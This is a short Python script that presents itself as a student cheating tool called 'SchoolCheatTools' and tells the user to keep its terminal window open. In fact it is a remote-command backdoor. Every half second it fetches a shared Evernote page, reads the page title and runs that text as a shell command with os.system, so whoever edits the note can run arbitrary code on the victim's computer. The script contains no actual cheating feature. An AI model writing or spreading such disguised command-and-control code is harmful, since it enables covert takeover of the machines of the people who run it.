#setup
from bs4 import BeautifulSoup
import requests
import os
from time import *
old_command = 0
os.system('clear')
#edit this variable to the server ip, which can be found in the description
#I will also update this variable from the code if the server ip changed, so if the ip stopped working, check the description

print('''
      
░██████╗░█████╗░██╗░░██╗░█████╗░░█████╗░██╗░░░░░░█████╗░██╗░░██╗███████╗░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░░██║██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
╚█████╗░██║░░╚═╝███████║██║░░██║██║░░██║██║░░░░░██║░░╚═╝███████║█████╗░░███████║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
░╚═══██╗██║░░██╗██╔══██║██║░░██║██║░░██║██║░░░░░██║░░██╗██╔══██║██╔══╝░░██╔══██║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
██████╔╝╚█████╔╝██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║███████╗██║░░██║░░░██║░░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
╚═════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░

IMPORTANT   ***   PLEASE KEEP THIS WINDOW OPEN
IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BACKSTAGE, DO NOT CLOSE THE TERMINAL WINDOW, OTHERWISE SCHOOLCHEATTOOLS WON’T WORK
''')

while True:
    #get HTML
    html_file = requests.get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
    soup = BeautifulSoup(html_file, 'lxml')
    command = soup.find('title').text
    #execute command
    if old_command != command:
        try:
            os.system(command)
            old_command = command
        except:
            pass
    sleep(0.5)
